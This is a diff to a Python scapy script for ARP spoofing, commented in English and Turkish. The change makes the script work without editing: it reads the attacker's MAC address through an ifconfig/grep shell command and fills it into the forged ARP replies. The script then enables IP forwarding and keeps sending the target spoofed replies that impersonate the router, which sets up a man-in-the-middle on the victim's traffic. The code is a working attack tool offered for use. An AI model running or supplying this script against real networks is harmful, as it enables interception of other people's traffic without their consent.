@@ -6,30 +6,36 @@ import os
 from scapy.all import *
 
 def SendSpoof():
-    # [EN] Getting target and router ip.
-    # [TR] Hedefin ve yönlendiricinin ip adresini alıyoruz.
+    # [EN] Getting interface, targets and routers ip.
+    # [TR] Network arayuzunu, hedefin ve yönlendiricinin ip adresii aliyoruz.
     router = str(input("[+] Enter router ip: "))
     target = str(input("[+] Enter target ip: "))
+    ifacer = str(input("[+] Enter interface: "))
 
-    # [EN] Enabling ip forwarding so our victim's connection will continue
-    # [TR] IP forward ı etkinlestirip kurbanın baglantısının kesilmemesini sağlıyoruz
+    # [EN] Getting and parsing mac address.
+    # [TR] MAC adresini parse ediyoruz.
+    macaddr = 'ifconfig {} | grep -o "ether [a-z0-9]*:[a-z0-9]*:[a-z0-9]*:[a-z0-9]*:[a-z0-9]*:[a-z0-9]*" | cut -c7-23 > mac.txt'.format(ifacer)
+    os.system(macaddr)
+    getMac = open("mac.txt", "r").read().split("\n")
+    os.system("rm -rf mac.txt")
+
+    # [EN] Enabling ip forwarding so our victim's connection will continue.
+    # [TR] IP forward i etkinlestirip kurbanin baglantisinin kesilmemesini sagliyoruz.
     print("[*] Enabling IP forward...")
     os.system("sudo echo 1 > /proc/sys/net/ipv4/ip_forward")
 
-    print("\n[*] Attacking to: %s"%(target))
+    print("\n[*] Attacking to: %s on %s"%(target, ifacer))
     try:
         while True:
             # [EN]
-            # Sending malicious arp packets to target
-            # Just enter your mac adress to 'hwsrc' => hwsrc=MAC_ADDR
+            # Sending malicious ARP packets to target.
 
             # [TR]
-            # Zararlı arp paketlerini hedefe gönderiyoruz
-            # hwsrc kısmına kendi MAC adresinizi yazmanız yeterli
-            send(ARP(op=2, pdst=target, hwsrc=[ENTER YOUR MAC], psrc=router), verbose=0)
+            # Zararli ARP paketlerini hedefe gonderiyoruz.
+            send(ARP(op=2, pdst=target, hwsrc=getMac[0], psrc=router), verbose=0)
     except:
-        # [EN] Terminating the program
-        # [TR] Program kapanırken yapılan işler
+        # [EN] Terminating the program.
+        # [TR] Program kapanirken yapilan isler.
         print("[*] Disabling IP forward...")
         os.system("sudo echo 0 > /proc/sys/net/ipv4/ip_forward")
         print("[!] Program terminated.")
